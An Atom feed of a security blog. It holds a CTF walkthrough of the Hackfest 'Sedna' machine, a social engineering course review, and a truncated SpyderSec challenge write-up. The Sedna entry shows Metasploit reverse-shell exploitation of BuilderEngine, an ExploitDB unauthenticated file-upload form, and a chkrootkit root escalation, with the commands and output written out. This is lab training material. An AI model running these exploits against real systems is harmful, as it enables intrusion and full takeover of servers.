<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Core dump overflow]]></title>
  <link href="http://chousensha.github.io/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2018-11-17T08:21:04-05:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016: Sedna]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna/"/>
    <updated>2018-11-16T14:22:02-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/16/hackfest-2016-sedna</id>
    <content type="html"><![CDATA[<p>This is another machine in the Hackfest 2016 series.</p>

<blockquote><p>There are 4 flags on this machine One for a shell One for root access Two for doing post
exploitation on Sedna</p></blockquote>

<p>Alrighty, let&rsquo;s hack the planet!</p>

<!-- more -->


<p>Plenty of open ports:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey: 
</span><span class='line'>|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
</span><span class='line'>|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
</span><span class='line'>|   256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
</span><span class='line'>|_  256 ca:36:3c:32:e6:24:f9:b7:b4:d4:1d:fc:c0:da:10:96 (ED25519)
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.9.5-3 (Ubuntu Linux)
</span><span class='line'>| dns-nsid: 
</span><span class='line'>|_  bind.version: 9.9.5-3-Ubuntu
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_Hackers
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>110/tcp   open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: CAPA TOP AUTH-RESP-CODE SASL PIPELINING STLS RESP-CODES UIDL
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100024  1          48644/tcp  status
</span><span class='line'>|_  100024  1          58324/udp  status
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp   open  imap        Dovecot imapd (Ubuntu)
</span><span class='line'>|_imap-capabilities: post-login STARTTLS more SASL-IR LITERAL+ have IMAP4rev1 listed OK capabilities Pre-login LOGINDISABLEDA0001 ID ENABLE IDLE LOGIN-REFERRALS
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>993/tcp   open  ssl/imaps?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>995/tcp   open  ssl/pop3s?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
</span><span class='line'>| http-methods: 
</span><span class='line'>|_  Potentially risky methods: PUT DELETE
</span><span class='line'>|_http-open-proxy: Proxy might be redirecting requests
</span><span class='line'>|_http-server-header: Apache-Coyote/1.1
</span><span class='line'>|_http-title: Apache Tomcat
</span><span class='line'>48644/tcp open  status      1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>Hit a couple of walls with the first enumeration attempts. The robots.txt has a Hackers entry that doesn&rsquo;t lead anywhere. Nothing usable for the bind server and the OpenSSH. enum4linux came back empty because I had no username/password pair to specify. And the Tomcat server did not use default credentials. So I fired up Gobuster and it found some additional things to check:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -w /usr/share/wordlists/dirb/big.txt -u http://192.168.145.128/
</span><span class='line'>
</span><span class='line'>=====================================================
</span><span class='line'>2018/11/16 14:56:38 Starting gobuster
</span><span class='line'>=====================================================
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/blocks (Status: 301)
</span><span class='line'>/files (Status: 301)
</span><span class='line'>/modules (Status: 301)
</span><span class='line'>/robots.txt (Status: 200)
</span><span class='line'>/server-status (Status: 403)
</span><span class='line'>/system (Status: 301)
</span><span class='line'>/themes (Status: 301)</span></code></pre></td></tr></table></div></figure>


<p>I visited each link, there are lots of directory listings for what appears to be a blog and ecommerce application. Some directories blocked me from entering, but I did find an indication of the target application inside <a href="http://192.168.145.128/themes/default_theme_2016/description.txt">http://192.168.145.128/themes/default_theme_2016/description.txt</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Default Theme 2016 for BuilderEngine V3.</span></code></pre></td></tr></table></div></figure>


<p>Searching for BuilderEngine exploits gave me 2 results, 1 exploitDB exploit and 1 Metasploit module. Let&rsquo;s see both in action, starting with Metasploit!</p>

<h2>Low privilege shell &ndash; Metasploit</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>search builderengine
</span><span class='line'>
</span><span class='line'>Matching Modules
</span><span class='line'>================
</span><span class='line'>
</span><span class='line'>   Name                                          Disclosure Date  Rank       Check  Description
</span><span class='line'>   ----                                          ---------------  ----       -----  -----------
</span><span class='line'>   exploit/multi/http/builderengine_upload_exec  2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
</span><span class='line'>
</span><span class='line'>Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.145.128  yes       The target address
</span><span class='line'>   RPORT      80               yes       The target port (TCP)
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   TARGETURI  /                yes       The base path to BuilderEngine
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (php/meterpreter_reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.145.133  yes       The listen address (an interface may be specified)
</span><span class='line'>   LPORT  8000             yes       The listen port</span></code></pre></td></tr></table></div></figure>


<p>Ran it and got a Meterpreter shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(multi/http/builderengine_upload_exec) &gt; run
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.145.133:8000 
</span><span class='line'>[+] Our payload is at: ppWvWjKRuV.php. Calling payload...
</span><span class='line'>[*] Calling payload...
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.145.133:8000 -&gt; 192.168.145.128:53518) at 2018-11-16 15:21:54 -0500
</span><span class='line'>[+] Deleted ppWvWjKRuV.php
</span><span class='line'>
</span><span class='line'>meterpreter &gt; </span></code></pre></td></tr></table></div></figure>


<p>The kernel is old, so plenty of privilege escalations should be available:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; sysinfo
</span><span class='line'>Computer    : Sedna
</span><span class='line'>OS          : Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686
</span><span class='line'>Meterpreter : php/linux
</span><span class='line'>
</span><span class='line'>meterpreter &gt; cat /etc/lsb-release
</span><span class='line'>DISTRIB_ID=Ubuntu
</span><span class='line'>DISTRIB_RELEASE=14.04
</span><span class='line'>DISTRIB_CODENAME=trusty
</span><span class='line'>DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"</span></code></pre></td></tr></table></div></figure>


<p>I used Searchsploit to look for Ubuntu 14.04 exploits and went with the <a href="https://www.exploit-db.com/exploits/37292/">37292.c overlayfs exploit</a>/ I downloaded it to the machine, compiled it, ran it..and surprise, no root! I also tried the Apport exploit, still no luck. While looking around though, I did find the low privilege flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>meterpreter &gt; cat /var/www/flag.txt
</span><span class='line'>bfbb7e6e6e88d9ae66848b9aeac6b289</span></code></pre></td></tr></table></div></figure>


<p>Before continuing with rooting the machine, I went back getting a shell without Metasploit.</p>

<h2>Low privilege shell &ndash; manual</h2>

<p>Here&rsquo;s the ExploitDB variant of arbitrary file upload:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat 40390.php 
</span><span class='line'>&lt;!-- 
</span><span class='line'># Exploit Title: BuilderEngine 3.5.0 Remote Code Execution via elFinder 2.0
</span><span class='line'># Date: 18/09/2016
</span><span class='line'># Exploit Author: metanubix
</span><span class='line'># Vendor Homepage: http://builderengine.org/
</span><span class='line'># Software Link: http://builderengine.org/page-cms-download.html
</span><span class='line'># Version: 3.5.0
</span><span class='line'># Tested on: Kali Linux 2.0 64 bit
</span><span class='line'># Google Dork: intext:"BuilderEngine Ltd. All Right Reserved"
</span><span class='line'>
</span><span class='line'>1) Unauthenticated Unrestricted File Upload:
</span><span class='line'>
</span><span class='line'>  POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/
</span><span class='line'>
</span><span class='line'>  Vulnerable Parameter: files[]
</span><span class='line'>
</span><span class='line'>  We can upload test.php and reach the file via the following link:
</span><span class='line'>  /files/test.php
</span><span class='line'>--&gt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data"&gt;
</span><span class='line'>  &lt;input type="file" name="files[]" /&gt;
</span><span class='line'>  &lt;input type="submit" value="send" /&gt;
</span><span class='line'>&lt;/form&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>I created a HTML file with the above code, changing localhost to the Sedna IP. Then I used it to upload a reverse shell:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/sedna/form.jpg" title="upload" alt="upload form"></p>

<p>Then I went to <a href="http://192.168.145.128/files/shell.php">http://192.168.145.128/files/shell.php</a> and got the shell on my Netcat listener. Back to searching for ways to get root. I also find a possible post-exploitation flag in <em>/etc/passwd</em>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crackmeforpoints:x:1000:1000::/home/crackmeforpoints:</span></code></pre></td></tr></table></div></figure>


<p>Cracking the password for this user might be another flag, but first I need root. Since the exploits I&rsquo;ve tried so far didn&rsquo;t work, I decided to go down the <a href="https://www.exploit-db.com/exploits/40839/">dirtycow</a> route. Unfortunately, that didn&rsquo;t work either, besides crashing the kernel. Well, I did not expect for so many privilege escalation exploits to fail.</p>

<h2>Getting root</h2>

<p>The solution came from something unexpected..and that needed a less targeted enumeration..more like generally looking around the box. Inside /etc, I noticed <em>chkrootkit</em> was present. I searched for available exploits and found a privilege escalation one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>searchsploit chkrootkit
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'> Exploit Title                                                                   |  Path
</span><span class='line'>                                                                                 | (/usr/share/exploitdb/)
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'>Chkrootkit - Local Privilege Escalation (Metasploit)                             | exploits/linux/local/38775.rb
</span><span class='line'>Chkrootkit 0.49 - Local Privilege Escalation                                     | exploits/linux/local/33899.txt
</span><span class='line'>--------------------------------------------------------------------------------- ----------------------------------------
</span><span class='line'>Shellcodes: No Result</span></code></pre></td></tr></table></div></figure>


<p>The exploit is available for version 0.49, so let&rsquo;s see what version is on the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@Sedna:/etc/chkrootkit$ ./chkrootkit -V
</span><span class='line'>./chkrootkit -V
</span><span class='line'>chkrootkit version 0.49</span></code></pre></td></tr></table></div></figure>


<p>Perfect! I decided to use Metasploit for this, I kept getting errors in my shell related to previous overlayfs attempts. But the way to do it manually is to put an executable file called <em>update</em> with content of your choice in /tmp and wait for chkrootkit to run it as root.</p>

<p>Metasploit came through and finally, I got root:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(unix/local/chkrootkit) &gt; options
</span><span class='line'>
</span><span class='line'>Module options (exploit/unix/local/chkrootkit):
</span><span class='line'>
</span><span class='line'>   Name        Current Setting       Required  Description
</span><span class='line'>   ----        ---------------       --------  -----------
</span><span class='line'>   CHKROOTKIT  /usr/sbin/chkrootkit  yes       Path to chkrootkit
</span><span class='line'>   SESSION                           yes       The session to run this module on.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   0   Automatic
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; set SESSION 1
</span><span class='line'>SESSION =&gt; 1
</span><span class='line'>msf exploit(unix/local/chkrootkit) &gt; run
</span><span class='line'>
</span><span class='line'>[!] SESSION may not be compatible with this module.
</span><span class='line'>[*] Started reverse TCP double handler on 192.168.145.133:4444 
</span><span class='line'>[!] Rooting depends on the crontab (this could take a while)
</span><span class='line'>[*] Payload written to /tmp/update
</span><span class='line'>[*] Waiting for chkrootkit to run via cron...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo EzISATvm3xKkw6bX;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "EzISATvm3xKkw6bX\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 2 opened (192.168.145.133:4444 -&gt; 192.168.145.128:37176) at 2018-11-17 08:05:04 -0500
</span><span class='line'>[+] Deleted /tmp/update
</span><span class='line'>whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Got the root flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /root/flag.txt
</span><span class='line'>a10828bee17db751de4b936614558305</span></code></pre></td></tr></table></div></figure>


<p>It was not over though, there should be one more flag, so I remembered the Tomcat server and looked inside <code>/etc/tomcat7/tomcat-users.xml</code> to find the username and password for Tomcat:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;user username="tomcat" password="submitthisforpoints" roles="manager-gui"/&gt;</span></code></pre></td></tr></table></div></figure>


<p>I didn&rsquo;t want to crack the password for the 4th flag, so I decided to call it a day at &frac34; flags.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ I must have a prodigious quantity of  \
</span><span class='line'>| mind; it takes me as much as a week   |
</span><span class='line'>| sometimes to make it up.              |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain, "The Innocents Abroad" /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Social Engineering Expert course review]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/11/social-engineering-expert-course-review/"/>
    <updated>2018-11-11T06:17:57-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/11/social-engineering-expert-course-review</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve recently taken the <a href="https://redteam-training.thinkific.com/courses/social-engineering-expert">Social Engineering Expert</a> from <a href="https://www.redteamsecure.com/">RedTeam Security</a>. If you don&rsquo;t know about them, check out their articles and videos about their engagements, they&rsquo;re doing some really cool stuff. In this post I will share my impressions about the course.</p>

<!-- more -->


<p>First of all, the author of the course is also the founder of RedTeam Security, Jeremiah Talamantes. He&rsquo;s authored a book called <a href="https://www.amazon.com/Social-Engineers-Playbook-Practical-Pretexting/dp/0692306617/ref=as_li_ss_tl?s=books&amp;ie=UTF8&amp;qid=1452290969&amp;sr=1-1&amp;keywords=social+engineers+playbook&amp;linkCode=sl1&amp;tag=talamantesus-20&amp;linkId=1f8b9cac92cdd16ae8d1956668d9942b">The Social Engineer’s Playbook: A Practical Guide to Pretexting</a>
, which I haven&rsquo;t tried yet. He is clearly very experienced and throughout the course, he&rsquo;s sharing various stories from the operations he&rsquo;s conducted.</p>

<p>The course is priced at 59$, but there are discounts every now and then. The training is video-based, where the instructor is sharing slides and talking about the topics. There are some valuable documents that can be downloaded, mainly templates and sample models for social engineering reports, plans and field notes guides. These can be used as starting points for your own operations.</p>

<p>As for the main structure of the course, it is as follows:</p>

<ul>
<li><p><strong>Introduction to social engineering</strong> &ndash; this covers the terminology around SE (it&rsquo;s getting tiring to type that) and goes through several examples</p></li>
<li><p><strong>Attack vectors</strong> &ndash; very useful section for actually conducting a SE campaign, it goes over different techniques and tools for social engineering your target, with actionable tips that you can use right away to enhance your operations. It also summarizes an attack in a very clear way, through the Social Engineering Kill Chain</p></li>
<li><p><strong>Methodology</strong> &ndash; this is another very practical section that covers planning and execution.</p></li>
<li><p><strong>Information gathering</strong> &ndash; physical and digital techniques for information gathering. There is a gear list for physical reconaissance that makes for a good reference. However, I found the digital side to be under-represented, only Maltego and Metagoofill are discussed. I would have expected at least a breakdown of the SET functionality, and more demos about OSINT and conducting phishing campaigns.</p></li>
<li><p><strong>Psychology &amp; manipulation</strong> &ndash; very applicable in day-to-day life, not limited to the field of security and SE, this describes various influencing and elicitation techniques that can be used to gain information or an expected behavior from a target. Not only that, but it also gives you awareness of such techniques being used on you.</p></li>
<li><p><strong>Non-verbal communicaton</strong> &ndash; this is where micro expressions and body language are discussed. It essentially gives you a roadmap for reading people&rsquo;s true feelings and intentions, detecting lies, and masking your own thoughts. Very practical to be aware of these thing in all kinds of settings and social interactions.</p></li>
</ul>


<p>All in all, I&rsquo;ve really enjoyed this course and highly recommend it. What would have made it even better would have been a practical component in order to complete it, a lab or task around phishing / OSINT, especially since at the end you get a certification. That being said, this is a very solid course and you don&rsquo;t need to be social engineered to get it :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ Change your thoughts and you change \
</span><span class='line'>\ your world.                         /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Take the SpyderSec Challenge]]></title>
    <link href="http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge/"/>
    <updated>2018-11-10T07:43:09-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/11/10/take-the-spydersec-challenge</id>
    <content type="html"><![CDATA[<p>The challenge:</p>

<blockquote><p>You are looking for two flags. Using discovered pointers in various elements of the running web
application you can deduce the first flag (a downloadable file) which is required to find the second
flag (a text file). Look, read and maybe even listen. You will need to use basic web application
recon skills as well as some forensics to find both flags.</p></blockquote>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE  SERVICE VERSION
</span><span class='line'>22/tcp closed ssh
</span><span class='line'>80/tcp open   http    Apache httpd
</span><span class='line'>|_http-server-header: Apache
</span><span class='line'>|_http-title: SpyderSec | Challenge</span></code></pre></td></tr></table></div></figure>


<p>There is just one page for the web server:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/spydersec/spydersec.png" title="spydersec" alt="spydersec"></p>

<p>There is some peculiar Javascript in the source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;
</span><span class='line'>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('7:0:1:2:8:6:3:5:4:0:a:1:2:d:c:b:f:3:9:e',16,16,'6c|65|72|27|75|6d|28|61|74|29|64|62|66|2e|3b|69'.split('|'),0,{}))
</span><span class='line'>&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>I used an <a href="https://beautifier.io/">online JS beautifier</a> to deobfuscate this to a hex string, which I then decoded to <code>alert(&lsquo;mulder.fbi&rsquo;);</code>. This name is familiar to me from the X-Files. Anyway, not sure about its relevance for now. Moving on with the information gathering, since nothing came out of Nikto or Gobuster, I browsed the page in Burp, and noticed a strange cookie being set:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Cookie: URI=%2Fv%2F81JHPbvyEQ8729161jd6aKQ0N4%2F</span></code></pre></td></tr></table></div></figure>


<p>URL decoding this gave me the value <code>/v/81JHPbvyEQ8729161jd6aKQ0N4/</code> Tried browsing to this and got a 403 Forbidden error. There is some piece of the puzzle missing..so I took the next step and downloaded all the images and ran them through exiftool..and finally got some luck with the Challenge.png image, which had a hex comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
